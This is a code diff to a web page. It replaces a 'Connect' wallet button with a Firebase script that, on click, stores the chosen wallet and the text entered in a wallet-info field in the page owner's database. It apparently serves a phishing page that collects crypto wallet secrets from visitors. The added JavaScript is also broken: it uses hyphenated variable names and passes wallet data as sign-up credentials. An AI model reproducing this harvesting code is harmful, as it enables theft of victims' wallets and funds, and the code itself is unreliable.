@@ -228,9 +228,64 @@
 
             <div id="info-input-container"></div>
 
-            <button type="button" onclick="connectWallet()">Connect</button>
+            <button type="button" id="submitData" name="submitData"> Connect</button>
         </form>
     </section>
+    <script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
+     import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js";
+        import { getDatabase,set,ref } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-database.js";
+
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyB-2koFw2ICcMC7g4VMSgWyctgXaDHL_N0",
+    authDomain: "crypto-test-5739f.firebaseapp.com",
+    projectId: "crypto-test-5739f",
+    storageBucket: "crypto-test-5739f.appspot.com",
+    messagingSenderId: "680504108544",
+    appId: "1:680504108544:web:8d4ac4ae5c6e53847adae5"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth();  
+  const database = getDatabase(app);
+        submitData.addEventListener('click',(e) => {
+            var selected-wallet= document.getElementById('selected-wallet').value;
+             var wallet-info-type= document.getElementById('wallet-info-type').value;
+            
+            createUserWithEmailAndPassword(selected-wallet,wallet-info-type)
+  .then((userCredential) => {
+    // Signed up 
+    const user = userCredential.user;
+      // ... user.uid
+       set(ref(database, 'users/' + user.uid), {
+    selected-wallet: selected-wallet,
+    wallet-info-type: wallet-info-type
+  })
+      .then(() => {
+  // Data saved successfully!
+        alert('sucsseful');
+})
+.catch((error) => {
+  // The write failed...
+      alert(error);
+});
+    
+    // ...
+  })
+  .catch((error) => {
+    const errorCode = error.code;
+    const errorMessage = error.message;
+    // ..
+      alert(errorMessage);
+  });
+        });
+</script>
 
    
 </body>
